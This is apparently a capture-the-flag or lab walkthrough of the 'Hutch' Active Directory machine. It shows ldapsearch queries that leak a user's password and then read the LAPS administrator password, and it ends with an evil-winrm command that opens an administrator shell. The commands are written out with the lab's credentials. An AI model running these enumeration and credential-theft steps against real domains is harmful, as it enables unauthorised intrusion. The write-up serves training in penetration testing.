# Hutch

I start off by scanning for open ports:

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

I try looking for smb shares but anonymous login does not show anything&#x20;

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

same for RPC client, then i try rid bruteforcing:

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

then i try launching the big boy and start an enum4linux scan but no hits. So i try ldapsearch:

```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.51.122" "(objectclass=*)"
```

And we get a hit:

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption><p>fmcsorley:CrabSharkJellyfish192</p></figcaption></figure>

then we can start enumerating some new stuff like authed smb shares:

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

So i download all the files in SYSVOL and look at some files:

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

I saw this, idk if it can be useful yet or no. Then i see this GptTmpl.inf file:

```powershell
(root?kali)-[/home/?/MACHINE/Microsoft/Windows NT/SecEdit]
# cat GptTmpl.inf 
[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595,*S-1-5-82-3682073875-1643277370-2842298652-3532359455-2406259117,*S-1-5-82-4068219030-1673637257-3279585211-533386110-4122969689,*S-1-5-19,*S-1-5-20,*S-1-5-82-1036420768-1044797643-1061213386-2937092688-4282445334,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236
SeAuditPrivilege = *S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595,*S-1-5-82-3682073875-1643277370-2842298652-3532359455-2406259117,*S-1-5-19,*S-1-5-20,*S-1-5-82-1036420768-1044797643-1061213386-2937092688-4282445334,*S-1-5-82-4068219030-1673637257-3279585211-533386110-4122969689,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeBatchLogonRight = *S-1-5-32-568,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559
SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-11,*S-1-5-32-554
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0
SeIncreaseQuotaPrivilege = *S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415,*S-1-5-82-271721585-897601226-2024613209-625570482-296978595,*S-1-5-82-3682073875-1643277370-2842298652-3532359455-2406259117,*S-1-5-82-4068219030-1673637257-3279585211-533386110-4122969689,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-82-1036420768-1044797643-1061213386-2937092688-4282445334,*S-1-5-82-3876422241-1344743610-1729199087-774402673-2621913236
SeInteractiveLogonRight = *S-1-5-32-548,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-9,*S-1-5-21-2216925765-458455009-2806096489-1115,*S-1-5-32-550,*S-1-5-32-549
SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549,*S-1-5-32-550
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
```

i dont know what it is yet, i google it and see some privesc methods related to this so maybe i'll use it later:

<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

After looking for authenticated enumeration techniques i see this one:

{% embed url="https://www.it-connect.fr/chapitres/comment-afficher-les-mots-de-passe-laps/" %}

and with this command i manage to get admin passwd:

```
ldapsearch -x -H 'ldap://192.168.51.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

<figure><img src="../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

Then i can just get a shell with evil-winrm:

```
evil-winrm -i 192.168.51.122 -u administrator -p ')](;C3G]$lhee['
```

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>
